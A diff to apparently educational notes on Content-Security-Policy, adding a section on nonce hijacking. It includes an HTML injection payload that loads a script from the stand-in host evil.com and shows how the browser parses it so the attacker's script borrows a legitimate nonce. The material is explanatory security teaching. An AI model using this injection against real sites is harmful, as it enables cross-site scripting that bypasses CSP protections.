@@ -409,6 +409,32 @@ Allowing all inline scripts is considered a security risk, so it's recommended t
 `Content-Security-Policy: script-src 'nonce-2726c7f26c'`
 
 ---
+# [Nonce - hijacking](https://www.w3.org/TR/CSP3/#security-nonce-hijacking)
+
+* Your code : 
+  `Content-Security-Policy: script-src 'nonce-abc'`
+  ```html
+  <p>Hello, [INJECTION POINT]</p>
+  <script nonce="abc" src="/good.js"></script>
+  ```
+
+* If an attacker injects the string 
+
+  ```html 
+  "<script src='https://evil.com/evil.js' "  
+  ````
+
+---
+
+- then the browser will receive the following:
+
+  ```html
+  <p>Hello, <script src='https://evil.com/evil.js' </p>
+  <script nonce="abc" src="/good.js"></script>
+  ```
+It will then parse that code, ending up with a script element with a `src` attribute pointing to a malicious payload, an attribute named `</p>`, an attribute named `"<script"`, a nonce attribute, and a second src attribute which is helpfully discarded as duplicate by the parser.
+
+---
 # Hashes
 
 Alternatively, you can create hashes from your inline scripts. CSP supports sha256, sha384 and sha512.
